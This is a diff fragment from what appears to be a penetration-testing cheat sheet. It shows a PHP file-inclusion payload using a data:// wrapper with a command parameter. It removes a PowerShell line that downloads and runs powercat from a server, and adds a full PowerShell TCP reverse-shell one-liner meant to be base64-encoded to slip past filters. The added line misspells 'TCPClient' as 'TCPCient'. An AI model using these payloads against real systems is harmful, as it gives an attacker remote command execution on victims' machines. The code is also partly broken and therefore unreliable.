@@ -68,7 +68,7 @@ http://IP/index.php?page=data://text/plain;base64,BASE64_DATA&cmd=ls
 - Execution on a windows system
 	- One-liner in powershell base64 to bypass a filter and get a reverse shell
 ```
-$Text = IEX(New-Object System.Net.WebClient).DownloadString("SERVER_ADDRESS/powercat.ps1");powercat -c LHOST -p LPORT -e powershell
+$Text = '$client = New-Object System.Net.Sockets.TCPCient("SERVER_ADDRESS",SERVER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 ```
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
